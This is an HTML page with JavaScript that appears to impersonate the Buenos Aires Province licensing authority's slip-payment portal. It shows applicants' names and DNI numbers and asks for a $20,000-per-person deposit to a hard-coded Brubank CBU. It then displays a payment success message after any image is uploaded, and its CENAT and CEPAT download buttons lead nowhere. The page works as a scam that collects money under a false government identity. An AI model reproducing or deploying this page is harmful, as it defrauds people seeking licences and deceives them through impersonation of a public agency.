<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Boletas Generadas</title>
    <link rel="stylesheet" href="style2.css">
</head>
<body>

    <header class="page2-header">
        <div class="logo-area">
            <h1>LICENCIASBA</h1>
            <img src="images/licencias22.png" alt="Logo Licencias" class="logo-ba">
        </div>
        
        <div class="header-blue-bar">
            <span>Bienvenido</span>
        </div>
    </header>

    <div class="page2-container">
        <main class="page2-main-content">
            <div class="title-row">
                <h2>LICENCIAS</h2>
                <a href="licencias.html" class="volver-button">VOLVER</a>
            </div>
            <p class="subtitle">BOLETAS</p>

            <div class="obtain-boleta-section">
                <span class="icon-check">✓</span>
                Obtener CENAT y CEPAT
            </div>

            <div class="boletas-info-container">
                <div id="applicants-list"></div>
                <div id="boletas-buttons" class="download-buttons-container"></div>
            </div>
            <div class="transfer-info" style="font-size: 14px; font-family: Arial, sans-serif;">
                <p><strong>Por favor, realice el depósito correspondiente de <span id="deposit-amount">$20,000</span> para completar la descarga de las boletas.</strong></p>
                <p><em>Aguarde 2 a 5 minutos para que el pago sea procesado y luego presione los botones de descarga para obtener sus boletas.</em></p>

                <!-- Botón que revela los datos de pago para billetera virtual -->
                <button id="pay-wallet-btn" style="display: inline-block; margin: 10px 0; padding: 8px 12px; background:#00C8C8; color:#fff; border:none; border-radius:4px; font-weight:bold;">Pagar con billetera virtual</button>

                <!-- Detalles de pago ocultos hasta que el usuario pulse el botón -->
                <div id="payment-details" style="display: none; margin-top: 10px;">
                    <!-- Alias eliminado -->
                    <p><strong>CBU:</strong> 1430001713045900300018</p>
                    <p><strong>Banco:</strong> Brubank</p>
                </div>

                <label for="comprobante" class="comprobante-label">Suba aquí su comprobante de pago:</label>
                <input type="file" id="comprobante" name="comprobante" class="comprobante-input" accept="image/*">
                <button id="accept-button" style="display: none; margin-top: 10px; padding: 5px 10px; font-size: 12px;">Aceptar</button>
                <p id="success-message" style="display: none; color: green; font-weight: bold;">¡El comprobante ha sido subido con éxito! Ya puede descargar las boletas.</p>
            </div>
            <script>
            // Leer datos del localStorage y mostrarlos (soporte 1 o 2 personas)
            (function() {
                const nombre = localStorage.getItem('licencias_nombre') || '';
                const documento = localStorage.getItem('licencias_documento') || '';
                const nombre2 = localStorage.getItem('licencias_nombre2') || '';
                const documento2 = localStorage.getItem('licencias_documento2') || '';
                const num = parseInt(localStorage.getItem('licencias_num_people') || '1', 10);

                const applicantsList = document.getElementById('applicants-list');
                const boletasButtons = document.getElementById('boletas-buttons');
                const depositAmountEl = document.getElementById('deposit-amount');

                // Limpia contenedores
                applicantsList.innerHTML = '';
                boletasButtons.innerHTML = '';

                // Construir lista de solicitantes
                const people = [];
                if (nombre) people.push({ name: nombre, doc: documento });
                if (num === 2 && nombre2) people.push({ name: nombre2, doc: documento2 });

                if (people.length === 0) {
                    applicantsList.innerHTML = '<p>No hay datos ingresados.</p>';
                } else {
                    const ul = document.createElement('ul');
                    ul.style.listStyle = 'none';
                    ul.style.padding = '0';
                    people.forEach((p, i) => {
                        const li = document.createElement('li');
                        li.style.marginBottom = '6px';
                        li.textContent = `${i+1}° Persona: ${p.name} — DNI: ${p.doc}`;
                        ul.appendChild(li);
                    });
                    applicantsList.appendChild(ul);
                }

                // Determinar monto total y número de boletas
                const singleAmount = 20000;
                const totalPeople = people.length || 1;
                const totalAmount = singleAmount * totalPeople;
                depositAmountEl.textContent = `$${totalAmount.toLocaleString('es-AR')}`;

                // Generar botones: por cada persona 1 CENAT y 1 CEPAT
                people.forEach((p, i) => {
                    const cenat = document.createElement('a');
                    cenat.href = '#';
                    cenat.className = 'boleta-button boleta-cenat';
                    cenat.textContent = `${i+1}° - BOLETA CENAT`;
                    boletasButtons.appendChild(cenat);

                    const cepat = document.createElement('a');
                    cepat.href = '#';
                    cepat.className = 'boleta-button boleta-cepat';
                    cepat.style.marginLeft = '8px';
                    cepat.textContent = `${i+1}° - BOLETA CEPAT`;
                    boletasButtons.appendChild(cepat);
                });
            })();
            </script>

            <script>
                // Mostrar detalles de pago al pulsar "Pagar con billetera virtual"
                const payWalletBtn = document.getElementById('pay-wallet-btn');
                const paymentDetails = document.getElementById('payment-details');
                if (payWalletBtn && paymentDetails) {
                    payWalletBtn.addEventListener('click', function() {
                        paymentDetails.style.display = 'block';
                        // desplazar a la sección de pago para que el usuario la vea
                        paymentDetails.scrollIntoView({ behavior: 'smooth', block: 'center' });
                        payWalletBtn.style.display = 'none';
                    });
                }

                document.getElementById('comprobante').addEventListener('change', function() {
                    const acceptButton = document.getElementById('accept-button');
                    acceptButton.style.display = 'inline-block';
                });

                document.getElementById('accept-button').addEventListener('click', function() {
                    const successMessage = document.getElementById('success-message');
                    successMessage.style.display = 'block';
                });
            </script>

            <div class="important-warning">
                <span class="icon-warning">⚠️</span>
                <div>
                    <p><strong>Importante</strong></p>
                    <p>Si tenés inconvenientes para descargar las boletas o cometiste un error al generar las mismas, deberás ponerte en contacto con tu Centro de Emisión de Licencias.</p>
                </div>
            </div>
        </main>
    </div>

    <footer class="page2-footer">
        LICENCIAS BA
        <p>Ministerio de Infraestructura y Servicios Públicos | Dirección Provincial de Política y Seguridad Vial | Buenos Aires Provincia</p>
    </footer>
</body>
</html>